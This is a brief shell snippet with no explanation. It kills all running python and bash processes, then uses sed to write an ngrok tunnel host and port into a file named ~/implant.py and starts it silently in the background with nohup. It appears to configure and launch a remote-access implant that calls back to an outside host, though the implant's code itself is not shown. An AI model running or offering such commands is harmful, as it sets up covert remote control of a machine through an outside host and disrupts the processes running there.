pkill -f python
pkill -f bash
killall python3 2>/dev/null; killall bash 2>/dev/null

sed -i 's/HOST/7.tcp.eu.ngrok.io/g; s/PORT/19876/g' ~/implant.py; pkill python3; nohup python3 ~/implant.py >/dev/null 2>&1 &
